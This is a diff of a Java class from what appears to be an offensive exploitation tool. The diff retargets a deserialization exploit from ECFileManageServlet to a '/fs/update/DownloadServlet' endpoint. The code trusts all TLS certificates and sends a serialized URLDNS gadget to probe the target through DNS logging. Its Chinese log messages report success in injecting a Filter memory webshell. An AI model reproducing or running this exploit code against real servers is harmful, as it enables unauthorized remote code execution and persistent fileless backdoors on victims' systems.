@@ -17,7 +17,7 @@ import java.io.ObjectOutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 
-public class ECFileManageServlet extends VulnBase {
+public class Fs_Update_DownloadServlet_Unserialize extends VulnBase {
     public static boolean DNSLOG = true;
     public static boolean JNDI = false;
     public static boolean EXEC = true;
@@ -26,16 +26,16 @@ public class ECFileManageServlet extends VulnBase {
 
     private String flag = "yyds";
 
-    public ECFileManageServlet() {
+    public Fs_Update_DownloadServlet_Unserialize() {
     }
 
-    public ECFileManageServlet(TextArea log, TextArea uploadLog, TextArea execLog) {
+    public Fs_Update_DownloadServlet_Unserialize(TextArea log, TextArea uploadLog, TextArea execLog) {
         super(log, uploadLog, execLog);
     }
 
     @Override
     public void exploit() throws ClassNotFoundException, NoSuchFieldException, InstantiationException, IllegalAccessException, IOException {
-        String vulnerable_url = Config.TARGET + "/servlet/ECFileManageServlet";
+        String vulnerable_url = Config.TARGET + "/fs/update/DownloadServlet";
 
         try {
             if (Config.MOD.equals("poc")) {
@@ -69,7 +69,7 @@ public class ECFileManageServlet extends VulnBase {
             SSLUtil.trustAllCertificates();
 
             // 发送请求
-            byte[] postData = Util.getSerializedData(URLDNS.getObject("ECFileManageServlet." + Config.DNSLOG));
+            byte[] postData = Util.getSerializedData(URLDNS.getObject("Fs_Update_DownloadServlet." + Config.DNSLOG));
             HttpURLConnection urldns_conn = (HttpURLConnection) apiUrl.openConnection();
 
             // 设置超时
@@ -83,12 +83,12 @@ public class ECFileManageServlet extends VulnBase {
 
             int responseCode = HttpUtil.getResponseCode(urldns_conn);
             if (responseCode == HttpURLConnection.HTTP_OK) {
-                logMessage("[+] ECFileManageServlet 反序列化探测成功! 状态码: " + responseCode + ". 请前往对应 dnslog 平台查看结果.");
+                logMessage("[+] Fs_Update_DownloadServlet 反序列化探测成功! 状态码: " + responseCode + ". 请前往对应 dnslog 平台查看结果.");
             } else {
-                logMessage("[-] ECFileManageServlet 反序列化探测失败, 状态码: " + responseCode);
+                logMessage("[-] Fs_Update_DownloadServlet 反序列化探测失败, 状态码: " + responseCode);
             }
         } catch (Exception e) {
-            logMessage("[-] ECFileManageServlet 反序列化探测失败, 请尝试手动探测. " + e);
+            logMessage("[-] Fs_Update_DownloadServlet 反序列化探测失败, 请尝试手动探测. " + e);
         }
     }
 
@@ -120,11 +120,11 @@ public class ECFileManageServlet extends VulnBase {
                 logMessage("[+] Filter 内存马注入成功! 请手动连接验证.");
                 return;
             } else {
-                logMessage("[-] ECFileManageServlet 反序列化利用失败, 状态码: " + responseCode);
+                logMessage("[-] Fs_Update_DownloadServlet 反序列化利用失败, 状态码: " + responseCode);
                 return;
             }
         } catch (Exception e) {
-            logMessage("[-] ECFileManageServlet 反序列化利用失败, 请尝试手动利用. " + e);
+            logMessage("[-] Fs_Update_DownloadServlet 反序列化利用失败, 请尝试手动利用. " + e);
             return;
         }
     }
